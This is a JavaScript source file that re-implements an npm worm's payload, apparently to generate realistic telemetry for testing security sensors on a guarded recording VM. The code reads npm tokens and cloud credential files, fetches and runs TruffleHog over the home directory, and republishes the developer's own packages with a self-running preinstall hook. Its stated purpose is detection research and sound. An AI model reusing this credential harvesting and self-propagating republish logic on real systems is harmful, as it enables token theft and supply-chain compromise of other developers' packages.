// The worm's payload, re-implemented from the public write-ups (../README.md)
// so that a sensor on the machine sees what it saw of the real one: the same
// programs started by the same parents, the same files opened, connections
// to the same hosts. What a sensor cannot see is not done: nothing this reads
// is kept, and no request carries any of it. The one thing sent anywhere is
// the republished packages, to the registry, which on a recording VM is
// macos/standin/registry.py on the host.
//
// It runs only on a recording VM, and stops at once anywhere else.
import { execFileSync, spawnSync } from "node:child_process";
import dns from "node:dns/promises";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const REGISTRY = "https://registry.npmjs.org";
const GITHUB = "https://api.github.com";
const HOME = os.homedir();

// A recording VM says it is one (vm/provision.sh writes the file), and its
// registry.npmjs.org is the stand-in on the host, a private address. Both,
// or nothing below runs.
async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) process.exit(0);
  const { address } = await dns.lookup("registry.npmjs.org", 4);
  if (!/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address)) process.exit(0);
}

const read = (p) => {
  try {
    return fs.readFileSync(path.join(HOME, p), "utf8");
  } catch {
    return "";
  }
};

// The stand-in's certificate is signed by the VM's own authority, which Bun
// does not read from the keychain; this option is Bun's.
const registry = (p, init = {}) => fetch(REGISTRY + p, { ...init, tls: { rejectUnauthorized: false } });

// 1. The tokens it works with: npm's from ~/.npmrc, GitHub's from the gh
//    command, and the cloud credentials where their tools keep them.
function tokens() {
  const npm = (read(".npmrc").match(/_authToken=(\S+)/) || [])[1] || "";
  let github = false;
  try {
    github = execFileSync("gh", ["auth", "token"], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim() !== "";
  } catch {}
  for (const p of [".aws/credentials", ".aws/config", ".config/gcloud/application_default_credentials.json",
    ".azure/azureProfile.json"]) read(p);
  return { npm, github };
}

// 2. TruffleHog, fetched from its GitHub release as the worm fetched it, and
//    run over the home directory. Its findings are counted and dropped.
//    Departure from the worm: --no-verification, so that the VM's planted
//    credentials are not tried against the services they imitate.
async function scan(tmp) {
  const release = await (await fetch(`${GITHUB}/repos/trufflesecurity/trufflehog/releases/latest`)).json();
  const want = `${os.platform()}_${os.arch() === "x64" ? "amd64" : os.arch()}.tar.gz`;
  const asset = (release.assets || []).find((a) => a.name.endsWith(want));
  if (!asset) return 0;
  const dir = path.join(tmp, "th");
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "th.tar.gz"), Buffer.from(await (await fetch(asset.browser_download_url)).arrayBuffer()));
  spawnSync("tar", ["-xzf", "th.tar.gz"], { cwd: dir });
  const run = spawnSync(path.join(dir, "trufflehog"), ["filesystem", HOME, "--json", "--no-verification"],
    { encoding: "utf8", maxBuffer: 1 << 30, stdio: ["ignore", "pipe", "ignore"] });
  return (run.stdout || "").split("\n").filter(Boolean).length;
}

// 3. Where the worm creates a repository under the developer's account and
//    uploads what it found, this makes one request to the same host that
//    carries nothing and needs no account.
async function upload() {
  await fetch(`${GITHUB}/rate_limit`).catch(() => {});
}

// 4. The developer's own packages, each fetched, given this install script,
//    one patch version up, and published with the developer's token.
async function republish(tmp, token) {
  const auth = { headers: { authorization: `Bearer ${token}` } };
  const who = await (await registry("/-/whoami", auth)).json();
  if (!who.username) return [];
  const found = await (await registry(`/-/v1/search?text=maintainer:${who.username}&size=100`, auth)).json();
  const done = [];
  for (const { package: pkg } of found.objects || []) {
    const doc = await (await registry(`/${pkg.name}`)).json();
    const tgz = await (await registry(new URL(doc.versions[pkg.version].dist.tarball).pathname)).arrayBuffer();
    const work = path.join(tmp, `pkg-${pkg.name}`);
    fs.mkdirSync(work, { recursive: true });
    fs.writeFileSync(path.join(work, "package.tgz"), Buffer.from(tgz));
    spawnSync("tar", ["-xzf", "package.tgz"], { cwd: work });
    const dir = path.join(work, "package");
    const manifest = JSON.parse(fs.readFileSync(path.join(dir, "package.json"), "utf8"));
    const [major, minor, patch] = manifest.version.split(".").map(Number);
    manifest.version = `${major}.${minor}.${patch + 1}`;
    manifest.scripts = { ...manifest.scripts, preinstall: "node setup.mjs" };
    fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify(manifest, null, 2) + "\n");
    for (const f of ["setup.mjs", "worker.js"]) fs.copyFileSync(path.join(import.meta.dirname, f), path.join(dir, f));
    const pub = spawnSync("npm", ["publish"], { cwd: dir, stdio: "ignore" });
    if (pub.status === 0) done.push(`${manifest.name}@${manifest.version}`);
  }
  return done;
}

await guard();
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "w-"));
const have = tokens();
await scan(tmp).catch(() => 0);
await upload();
if (have.npm) await republish(tmp, have.npm).catch(() => []);
